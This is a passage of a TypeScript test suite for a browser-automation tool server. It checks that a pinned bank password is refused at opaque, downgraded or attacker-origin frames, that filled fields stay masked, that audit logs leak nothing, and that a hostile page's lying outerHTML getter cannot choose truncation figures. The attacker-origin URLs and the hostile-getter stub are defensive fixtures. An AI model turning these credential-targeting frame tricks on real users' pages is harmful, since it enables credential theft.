		assertEquals(f.dispatched.length, 0, 'a refusal must dispatch nothing');
		assertEquals(f.record.audit.read({ principal: 'test', all: true }).entries.length, 0);
		assertEquals(f.wired.calls, ['Page.getLayoutMetrics', 'Page.getFrameTree']);
		assert(!error.message.includes(BANK_SECRET), error.message);
		assert(!error.message.includes(BANK_SECRET.slice(0, 6)), error.message);
	} finally {
		store.substitute = original as typeof store.substitute;
		f.restore();
		await f.registry.shutdown();
	}
});

/** **Every opaque or plaintext frame tree refuses the credential.** */
Deno.test('fill_secret: the credential is refused at every opaque and plaintext frame tree, and never dispatched', async () => {
	const rows: Array<{ name: string; wire: SecretWire }> = [
		{ name: 'top and frame BOTH about:blank', wire: { topUrl: 'about:blank' } },
		{
			name: 'top about:blank, frame data: — two DIFFERENT opaque origins with the same serialization',
			wire: { topUrl: 'about:blank', frameUrl: 'data:text/html,<input name=p>' },
		},
		{ name: 'top and frame BOTH a data: document', wire: { topUrl: 'data:text/html,<input name=p>' } },
		{
			name: "top and frame a blob: from the ATTACKER's origin",
			wire: { topUrl: 'blob:https://evil.example/9f0c-uuid' },
		},
		{
			name: 'a blob: minted by the PINNED origin — still not a document the pin approved',
			wire: { topUrl: 'blob:https://bank.example.com/9f0c-uuid' },
		},
		{
			name: 'the pinned host over plaintext http (a downgrade)',
			wire: { topUrl: 'http://bank.example.com/login' },
		},
		{ name: 'a new-tab URL', wire: { topUrl: 'chrome://newtab/' } },
		{
			name: 'a legitimate https top with an about:blank child a script wrote into',
			wire: { topUrl: 'https://bank.example.com/login', frameUrl: 'about:blank' },
		},
	];
	for (const row of rows) {
		const f = await secretHarness(row.wire);
		let bound = 0;
		const store = f.secrets as unknown as { substitute: (text: string, url: string) => { text: string } };
		const originalSubstitute = store.substitute.bind(f.secrets);
		store.substitute = (text: string, url: string) => {
			const out = originalSubstitute(text, url);
			if (out.text === BANK_SECRET) bound++;
			return out;
		};
		try {
			const error = await assertRejects(
				() => tools.browserFillSecret({ index: PASSWORD_INDEX, secret: 'bank_password', state_token: f.token }, f.ctx),
				ToolError,
				undefined,
				row.name,
			);
			assertEquals(error.code, 'navigation-blocked', `${row.name}: ${error.message}`);
			assertEquals(bound, 0, `${row.name}: the credential was bound to a URL the pin does not cover`);
			assertEquals(f.dispatched.length, 0, `${row.name}: the credential reached the page`);
			assertEquals(
				f.record.audit.read({ principal: 'test', all: true }).entries,
				[],
				`${row.name}: the ledger recorded a spend the pin never approved`,
			);
			assert(!error.message.includes(BANK_SECRET), `${row.name} leaked the value: ${error.message}`);
			assert(!error.message.includes(BANK_SECRET.slice(0, 6)), `${row.name} leaked a prefix: ${error.message}`);
		} finally {
			store.substitute = originalSubstitute as typeof store.substitute;
			f.restore();
			await f.registry.shutdown();
		}
	}
});

/**
 * The row the refusals above are worthless without — the pin is a narrowing, and a narrowing that swallowed the
 * ordinary case would be an outage wearing a control's name.
 */
Deno.test('fill_secret: an ordinary https fill on the pinned domain still succeeds, frame and all', async () => {
	const f = await secretHarness({
		topUrl: 'https://bank.example.com/login',
		frameUrl: 'https://bank.example.com/login/inner',
	});
	try {
		const result = await tools.browserFillSecret(
			{ index: PASSWORD_INDEX, secret: 'bank_password', state_token: f.token },
			f.ctx,
		) as { structuredContent: Record<string, unknown> };
		assertEquals(f.dispatched.length, 1, 'the legitimate fill must still reach the page');
		assertEquals((f.dispatched[0] as { text?: string }).text, BANK_SECRET);
		assertEquals(result.structuredContent.origin, 'https://bank.example.com');
		const entries = f.record.audit.read({ principal: 'test', all: true }).entries;
		assertEquals(entries.length, 1);
		assertEquals(entries[0]?.origin, 'https://bank.example.com');
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

/**
 * Exit redaction matches a secret exactly, and a page's `maxlength`, reformatting or CRLF normalisation change the
 * live value.
 */
Deno.test('secret marking: browser_fill_secret records a plain text field, and the password predicate then holds for it', async () => {
	const f = await secretHarness();
	try {
		const map = f.record.session.cachedBrowserState!.domState.selectorMap;
		const entry = [...map].find(([, node]) =>
			node.nodeName === 'INPUT' && !isPasswordField(node) &&
			['', 'text'].includes((node.attributes.type ?? '').trim().toLowerCase())
		);
		assert(entry !== undefined, 'the fixture has a plain text input');
		const [index, node] = entry;
		await tools.browserFillSecret({ index, secret: 'bank_password', state_token: f.token }, f.ctx);
		assertEquals(f.dispatched.length, 1);
		assert(isSecretFilled(node), 'the filled field is recorded');
		assert(isPasswordField(node), 'and the one password predicate now holds for it');
		assertEquals(recordTextOf(node), '');
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

/**
 * End to end over a recorded page whose text field holds a live typed value: once the field is recorded
 * as secret-filled, the value is on no observation path — not `input.value`, not `text` or the label, and not
 * the serialized page, whose `value=` the vendored serializer takes from the AX value.
 */
Deno.test("secret marking: a recorded secret-filled field's live value leaves no observation path", async () => {
	const h = await captureHarness('live_value_vs_attribute');
	try {
		const fields = resolveFields(['full']);
		const before = await observe(h.record, { fields, elementLimit: 5000 });
		const field = before.elements.find((element) =>
			typeof element.input?.value === 'string' && element.input.value.length >= 6 &&
			element.input.value !== MASKED_INPUT_VALUE
		);
		assert(field !== undefined, 'the fixture has a text field with a live value');
		const live = field.input!.value!;
		assert(JSON.stringify(before).includes(live), 'not vacuous');
		const node = h.record.session.cachedBrowserState!.domState.selectorMap.get(field.index)!;
		markSecretFilled(node.sessionId, node.backendNodeId); // what browser_fill_secret does, above

		const after = await observe(h.record, { fields, elementLimit: 5000 });
		const whole = JSON.stringify(after);
		const at = whole.indexOf(live);
		assert(at < 0, `the live value leaked: …${whole.slice(Math.max(0, at - 120), at + live.length + 20)}…`);
		assertEquals(after.elements.find((element) => element.index === field.index)?.input?.value, MASKED_INPUT_VALUE);
		assertEquals(inputStateOf(node)?.value, MASKED_INPUT_VALUE);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('secret marking: browser_type with a substituted secret records its field too', async () => {
	const f = await secretHarness();
	try {
		const map = f.record.session.cachedBrowserState!.domState.selectorMap;
		const entry = [...map].find(([index, node]) =>
			index !== PASSWORD_INDEX && node.nodeName === 'INPUT' && !isPasswordField(node) && !isSecretFilled(node) &&
			['', 'text'].includes((node.attributes.type ?? '').trim().toLowerCase())
		);
		assert(entry !== undefined, 'the fixture has a second plain text field the fill test above did not record');
		const [index, node] = entry;
		await tools.browserType(
			{ index, text: '<secret>bank_password</secret>', state_token: f.token },
			f.ctx,
		);
		assert(isSecretFilled(node));
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

Deno.test('secret marking: a marked <textarea> is a password field to the predicate and to input.value', () => {
	const textarea = {
		...fakeNode('TEXTAREA'),
		sessionId: 'MARK-SESSION',
		backendNodeId: 4242,
		snapshotNode: { textValue: 'line one\r\nZq8-TEXTAREA-SECRET', inputValue: null },
	} as unknown as EnhancedDomTreeNode;
	assertEquals(isPasswordField(textarea), false, "a textarea is never a password by the page's word");
	assertEquals(inputStateOf(textarea)?.value, 'line one\r\nZq8-TEXTAREA-SECRET');
	markSecretFilled('MARK-SESSION', 4242);
	assert(isPasswordField(textarea));
	assertEquals(inputStateOf(textarea)?.value, MASKED_INPUT_VALUE);
	const elsewhere = { ...textarea, sessionId: 'MARK-OTHER' } as EnhancedDomTreeNode;
	assertEquals(isPasswordField(elsewhere), false);
});

/** The amplifier, at the tool that carries it: `available_secrets` is an authorization statement. */
Deno.test('fill_secret: available_secrets stops advertising a pinned secret at an origin the pin refuses', async () => {
	const f = await secretHarness();
	try {
		for (
			const url of [
				'about:blank',
				'chrome://newtab/',
				'data:text/html,<input name=p>',
				'blob:https://evil.example/9f0c-uuid',
				'blob:https://bank.example.com/9f0c-uuid',
				'http://bank.example.com/login',
			]
		) {
			const advertised = f.secrets.namesFor(url);
			assertEquals(
				advertised.includes('bank_password'),
				false,
				`browser_get_state would still offer bank_password at ${url}: ${JSON.stringify(advertised)}`,
			);
		}
		assert(f.secrets.namesFor('https://bank.example.com/login').includes('bank_password'));
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

Deno.test('fill_secret: browser_type REFUSES a <secret> placeholder under a scaled viewport', async () => {
	const f = await secretHarness({ scale: 1.5 });
	try {
		const error = await assertRejects(
			() => tools.browserType({ index: PASSWORD_INDEX, text: '<secret>local_password</secret>' }, f.ctx),
			ToolError,
		);
		assertEquals(error.code, 'browser-unavailable');
		assertEquals(error.extras.reason, 'viewport-scaled');
		assertEquals(f.dispatched.length, 0);

		f.wired.calls.length = 0;
		await tools.browserType({ index: PASSWORD_INDEX, text: 'ordinary text' }, f.ctx);
		assertEquals(f.wired.calls, [], 'a type with no placeholder must not pay for a check with no content');
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

Deno.test('fill_secret: a browser_type substitution is audited too, so the ledger has no hole in it', async () => {
	const f = await secretHarness();
	try {
		await tools.browserType(
			{ index: PASSWORD_INDEX, text: '<secret>bank_password</secret>', state_token: f.token },
			f.ctx,
		);
		const entries = f.record.audit.read({ principal: 'test' }).entries;
		assertEquals(entries.length, 1);
		assertEquals(entries[0]?.kind, 'secret-fill');
		assertEquals(entries[0]?.secret, 'bank_password');
		assertEquals(entries[0]?.frame_id, FORM_FRAME, 'the frame the pin was checked against, not an empty id');
		assertEquals(entries[0]?.origin, 'https://bank.example.com');
		assert(!JSON.stringify(entries).includes(BANK_SECRET));
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

Deno.test('fill_secret: browser_audit returns own entries under mcp:invoke and all of them under admin', async () => {
	const f = await secretHarness();
	try {
		f.record.audit.append({
			session_id: f.record.id,
			principal: 'someone-else',
			kind: 'evaluate',
			frame_id: 'F',
			origin: 'https://other.example',
		});
		await tools.browserFillSecret({ index: PASSWORD_INDEX, secret: 'bank_password', state_token: f.token }, f.ctx);

		const own = await tools.browserAudit({}, f.ctx) as {
			structuredContent: { entries: Array<{ principal: string }>; scope: string; dropped: number };
		};
		assertEquals(own.structuredContent.scope, 'own');
		assertEquals(own.structuredContent.entries.map((entry) => entry.principal), ['test']);

		const admin = await tools.browserAudit({}, { ...f.ctx, scopes: new Set(['mcp:invoke', 'admin'] as const) }) as {
			structuredContent: { entries: Array<{ principal: string }>; scope: string };
		};
		assertEquals(admin.structuredContent.scope, 'all');
		assertEquals(admin.structuredContent.entries.length, 2);

		const closed = await tools.browserAudit({}, f.ctx) as { structuredContent: { scope: string } };
		assertEquals(closed.structuredContent.scope, 'own');
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

// --- browser_get_html: provenance, truncation and the cross-origin gate -----------------------

/** The structured half of a `browser_get_html` success, validated against its own output schema. */
function htmlPayload(result: ToolResult): Record<string, unknown> {
	const payload = (result as { structuredContent: Record<string, unknown> }).structuredContent;
	assertEquals(
		OUTPUT.browser_get_html.parse(payload),
		payload,
		'the payload and its declared output schema disagree',
	);
	return payload;
}

/** **The default read's cost, asserted as a list.** */
Deno.test('get_html: browser_get_html {} sends exactly [Page.getFrameTree, Runtime.evaluate] and observes nothing', async () => {
	const h = await frameCdpHarness('iframe_crossorigin');
	try {
		const result = await tools.browserGetHtml({}, h.ctx);
		assertEquals(h.methods(), ['Page.getFrameTree', 'Runtime.evaluate']);
		assertEquals(h.observations(), 0, 'the default path rebuilt the element table');
		assertEquals(h.calls[0]?.sessionId, PAGE_SESSION);
		assertEquals(h.calls[1]?.sessionId, PAGE_SESSION);

		const payload = htmlPayload(result);
		assertEquals(payload.frame_id, h.topFrameId);
		assertEquals(payload.url, 'https://example.com/page');
		assertEquals(payload.state_token, h.record.session.cachedBrowserState?.stateToken ?? null);
		assertEquals(payload.length, TOP_DOCUMENT.length);
		assertEquals(payload.returned_length, TOP_DOCUMENT.length);
		assertEquals(payload.truncated, false);
		assertEquals(payload.media_type, 'text/html');
		assertEquals('audit_id' in payload, false);
		assertEquals(h.record.audit.read({ principal: 'test', all: true }).entries.length, 0);
	} finally {
		await h.registry.shutdown();
	}
});

/** **Naming the top frame's id in `browser_get_html` is the same read as omitting it.** */
Deno.test('get_html: browser_get_html {frame_id: <top id>} is the top document — no scope, no audit row', async () => {
	const h = await frameCdpHarness('iframe_crossorigin');
	try {
		const result = await tools.browserGetHtml({ frame_id: h.topFrameId }, h.ctx);
		assertEquals(h.methods(), ['Page.getFrameTree', 'Runtime.evaluate']);
		assertEquals(h.observations(), 0);

		const payload = htmlPayload(result);
		assertEquals(payload.frame_id, h.topFrameId);
		assertEquals(payload.url, 'https://example.com/page');
		assertEquals(payload.length, TOP_DOCUMENT.length);
		assertEquals(payload.returned_length, TOP_DOCUMENT.length);
		assertEquals((result as { content: Array<{ text: string }> }).content[0]?.text, TOP_DOCUMENT);
		assertEquals('audit_id' in payload, false);
		assertEquals(h.record.audit.read({ principal: 'test', all: true }).entries.length, 0);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('get_html: the top document’s frame_id and url are LIVE, not the capture’s memory of them', async () => {
	const h = await frameCdpHarness('iframe_crossorigin', {
		tree: () => ({ frame: { id: 'F-TOP-AFTER-NAVIGATION', url: 'https://moved.example.com/after' } }),
	});
	try {
		const payload = htmlPayload(await tools.browserGetHtml({}, h.ctx));
		assert(h.topFrameId !== 'F-TOP-AFTER-NAVIGATION', 'the cached id must differ, or this proves nothing');
		assertEquals(payload.frame_id, 'F-TOP-AFTER-NAVIGATION');
		assertEquals(payload.url, 'https://moved.example.com/after');
	} finally {
		await h.registry.shutdown();
	}
});

/** `length` is the document's true length even when the cap binds. */
Deno.test('get_html: a truncated read reports the TRUE length, the returned length, and the frozen notice', async () => {
	const huge = `${TOP_DOC_SENTINEL}${'z'.repeat(HTML_LIMIT + 4_000)}`;
	const h = await frameCdpHarness('iframe_crossorigin', { topHtml: huge });
	try {
		const result = await tools.browserGetHtml({}, h.ctx);
		const payload = htmlPayload(result);
		assertEquals(payload.length, huge.length, 'the true length must survive truncation');
		assertEquals(payload.returned_length, HTML_LIMIT);
		assertEquals(payload.truncated, true);
		const text = (result as { content: Array<{ text: string }> }).content[0]!.text;
		assertEquals(text.length, HTML_LIMIT + `\n\n[truncated at ${HTML_LIMIT} characters]`.length);
		assertStringIncludes(text, `[truncated at ${HTML_LIMIT} characters]`);
		assertEquals(text.slice(0, HTML_LIMIT), huge.slice(0, HTML_LIMIT));
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('get_html: a named same-process child frame answers with the CHILD’s document and the CHILD’s url', async () => {
	const h = await frameCdpHarness('iframe_same_site_port', {
		tree: (top, child) => ({
			frame: { id: top, url: 'https://example.com/page' },
			childFrames: [{ frame: { id: child, url: 'https://example.com/page/content' } }],
		}),
	});
	try {
		const result = await tools.browserGetHtml({ frame_id: h.childFrameId }, h.ctx);
		const payload = htmlPayload(result);
		assertEquals(payload.frame_id, h.childFrameId);
		assertEquals(payload.url, 'https://example.com/page/content');
		assertEquals(payload.length, CHILD_DOCUMENT.length);
		const text = (result as { content: Array<{ text: string }> }).content[0]!.text;
		assertEquals(text, CHILD_DOCUMENT);
		assert(!JSON.stringify(result).includes(TOP_DOC_SENTINEL), 'the top document reached a frame read');
		assertEquals(h.methods().filter((method) => method === 'Runtime.evaluate'), []);
		assertEquals('audit_id' in payload, false);
		assertEquals(h.record.audit.read({ principal: 'test', all: true }).entries.length, 0);
	} finally {
		await h.registry.shutdown();
	}
});

/** The permit side of the gate, and the one row it writes. */
Deno.test('get_html: a cross-origin frame IS readable with the evaluate scope, and writes exactly one audit row', async () => {
	const h = await frameCdpHarness('iframe_same_site_port', {
		tree: (top, child) => ({
			frame: { id: top, url: 'http://127.0.0.1:38111/iframe_same_site_port.html' },
			childFrames: [{ frame: { id: child, url: 'http://127.0.0.1:38112/frames/frame_depth2.html?token=SECRET' } }],
		}),
	});
	const ctx: ToolContext = { ...h.ctx, scopes: new Set(['mcp:invoke', 'evaluate'] as const) };
	try {
		const payload = htmlPayload(await tools.browserGetHtml({ frame_id: h.childFrameId }, ctx));
		const entries = h.record.audit.read({ principal: 'test', all: true }).entries;
		assertEquals(entries.length, 1);
		const entry = entries[0]!;
		assertEquals(entry.kind, 'read-frame-html');
		assertEquals(entry.frame_id, h.childFrameId);
		assertEquals(entry.origin, 'http://127.0.0.1:38112');
		assertEquals(entry.ok, true);
		assertEquals(entry.result_bytes, new TextEncoder().encode(CHILD_DOCUMENT).length);
		assertEquals(payload.audit_id, entry.audit_id);
		const serialized = JSON.stringify(entries);
		assert(!serialized.includes('token=SECRET'), 'the frame URL’s query reached the ledger');
		assert(!serialized.includes('BIL51'), 'a document fragment reached the ledger');
		assert(!serialized.includes(TOP_DOC_SENTINEL));
	} finally {
		await h.registry.shutdown();
	}
});

/** **The two size fields carry two different units, deliberately.** */
Deno.test('get_html: result_bytes is UTF-8 BYTES and returned_length is CHARACTERS, on a multi-byte document', async () => {
	const crossOrigin = {
		tree: (top: string, child: string) => ({
			frame: { id: top, url: 'http://127.0.0.1:38111/iframe_same_site_port.html' },
			childFrames: [{ frame: { id: child, url: 'http://127.0.0.1:38112/frames/frame_depth2.html' } }],
		}),
	};
	const scoped = (ctx: ToolContext): ToolContext => ({ ...ctx, scopes: new Set(['mcp:invoke', 'evaluate'] as const) });
	const bytesOf = (text: string) => new TextEncoder().encode(text).length;

	const document = '<html><body><p>日本語の見出し — café naïve — Ω≈ç√</p></body></html>';
	const h = await frameCdpHarness('iframe_same_site_port', { ...crossOrigin, childHtml: document });
	try {
		const payload = htmlPayload(await tools.browserGetHtml({ frame_id: h.childFrameId }, scoped(h.ctx)));
		const entry = h.record.audit.read({ principal: 'test', all: true }).entries[0]!;
		assertEquals(payload.returned_length, document.length, 'returned_length is characters');
		assertEquals(entry.result_bytes, bytesOf(document), 'result_bytes is UTF-8 bytes');
		assert(
			entry.result_bytes !== payload.returned_length,
			`the fixture stopped being multi-byte: ${entry.result_bytes} === ${payload.returned_length}`,
		);
	} finally {
		await h.registry.shutdown();
	}

	const huge = `<html><body>${'見'.repeat(HTML_LIMIT)}</body></html>`;
	const capped = huge.slice(0, HTML_LIMIT);
	const notice = `\n\n[truncated at ${HTML_LIMIT} characters]`;
	const t = await frameCdpHarness('iframe_same_site_port', { ...crossOrigin, childHtml: huge });
	try {
		const result = await tools.browserGetHtml({ frame_id: t.childFrameId }, scoped(t.ctx));
		const payload = htmlPayload(result);
		const entry = t.record.audit.read({ principal: 'test', all: true }).entries[0]!;
		assertEquals(payload.truncated, true);
		assertEquals(payload.length, huge.length, 'the TRUE length survives truncation');
		assertEquals(payload.returned_length, HTML_LIMIT, 'characters before the notice');
		assertEquals(entry.result_bytes, bytesOf(capped), 'UTF-8 bytes of the capped HTML');
		assertEquals(
			bytesOf(capped + notice) - (entry.result_bytes ?? 0),
			bytesOf(notice),
			'the truncation notice was counted into result_bytes',
		);
		assertStringIncludes((result as { content: Array<{ text: string }> }).content[0]!.text, notice);
	} finally {
		await t.registry.shutdown();
	}
});

/** **The page does not get to say how much it sent.** */
Deno.test('get_html: a hostile outerHTML getter chooses neither the payload nor the numbers, on all three extraction shapes', async () => {
	const PAYLOAD_CHARS = HTML_LIMIT * 5;
	const NOTICE = `\n\n[truncated at ${HTML_LIMIT} characters]`;
	/**
	 * The getter's return value, shaped as a real page can build it: `length` reports one
	 * character over the cap — enough to take the extraction's `slice` branch, and enough to make a
	 * server that believes the number answer `truncated: true` — and `slice` ignores its arguments.
	 */
	const liar = (): PageOuterHtml => {
		const payload = 'H'.repeat(PAYLOAD_CHARS);
		return { length: HTML_LIMIT + 1, slice: () => payload };
	};
	const sameOrigin = (top: string, child: string) => ({
		frame: { id: top, url: 'https://example.com/page' },
		childFrames: [{ frame: { id: child, url: 'https://example.com/page/child' } }],
	});
	const shapes: ReadonlyArray<{
		readonly name: string;
		readonly extraction: string;
		open(): Promise<FrameCdpHarness>;
		read(h: FrameCdpHarness): Promise<ToolResult>;
	}> = [
		{
			name: 'top document — the default path, no frame_id and no scope check at all',
			extraction: 'Runtime.evaluate',
			open: () => frameCdpHarness('iframe_crossorigin', { tree: sameOrigin, topHtml: liar() }),
			read: (h) => tools.browserGetHtml({}, h.ctx),
		},
		{
			name: 'same-process child — Runtime.callFunctionOn on the Document handle',
			extraction: 'Runtime.callFunctionOn',
			open: () => frameCdpHarness('iframe_same_site_port', { tree: sameOrigin, childHtml: liar() }),
			read: (h) => tools.browserGetHtml({ frame_id: h.childFrameId }, h.ctx),
		},
		{
			name: 'out-of-process frame — Runtime.evaluate against its own target',
			extraction: 'Runtime.evaluate',
			open: () => frameCdpHarness('iframe_crossorigin', { tree: sameOrigin, childHtml: liar() }),
			read: (h) => tools.browserGetHtml({ frame_id: h.childFrameId }, h.ctx),
		},
	];
	for (const shape of shapes) {
		const h = await shape.open();
		try {
			const result = await shape.read(h);
			const payload = htmlPayload(result);
			const text = (result as { content: Array<{ text: string }> }).content[0]!.text;
			assertEquals(payload.returned_length, HTML_LIMIT, `${shape.name}: returned_length escaped the cap`);
			assertEquals(text.length, HTML_LIMIT + NOTICE.length, `${shape.name}: the text block escaped the cap`);
			assertStringIncludes(text, NOTICE);
			assertEquals(payload.truncated, true, shape.name);
			assertEquals(payload.length, PAYLOAD_CHARS, `${shape.name}: length must be measured, not believed`);
			assert(
				(payload.length as number) >= (payload.returned_length as number),
				`${shape.name}: length ${payload.length} understates returned_length ${payload.returned_length}`,
			);
			assertEquals(
				h.methods().filter((method) => method === shape.extraction).length,
				1,
				`${shape.name}: expected exactly one ${shape.extraction}, sent ${h.methods().join(', ')}`,
			);
		} finally {
			await h.registry.shutdown();
		}
	}
});

/** The honest half of the row above: the server-side clamp must not cost the true length. */
Deno.test('get_html: an honest page keeps its TRUE length — the clamp floors the number, it does not replace it', async () => {
	const huge = `${TOP_DOC_SENTINEL}${'z'.repeat(HTML_LIMIT * 3)}`;
	const h = await frameCdpHarness('iframe_crossorigin', { topHtml: huge });
	try {
		const payload = htmlPayload(await tools.browserGetHtml({}, h.ctx));
		assertEquals(payload.length, huge.length, 'the honest true length must survive the server-side clamp');
		assertEquals(payload.returned_length, HTML_LIMIT);
		assertEquals(payload.truncated, true);
		assert((payload.length as number) > HTML_LIMIT, 'the fixture stopped exceeding the cap');
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('tools: a read-only tool with no default session says why it will not create one', async () => {
	let launched = 0;
	const registry = new SessionRegistry({
		reapIntervalMs: 0,
		launch: () => {
			launched += 1;
			return Promise.resolve(fakeSession().session);
		},
	});
	const ctx: ToolContext = { registry, allowedDomains: [], principal: 'test' };
	try {
		const omitted = await assertRejects(() => tools.browserAudit({}, ctx), ToolError);
		assertEquals(omitted.code, 'unknown-session');
		assertStringIncludes(omitted.message, 'created by the first tool that opens a page');
		const named = await assertRejects(() => tools.browserAudit({ session_id: 'nope' }, ctx), ToolError);
		assertStringIncludes(named.message, 'no session with id nope');
		assertEquals(named.message.includes('created by'), false, 'a named session keeps the plain refusal');
		assertEquals(launched, 0, 'reading never launches a browser');
	} finally {
		await registry.shutdown();
	}
});
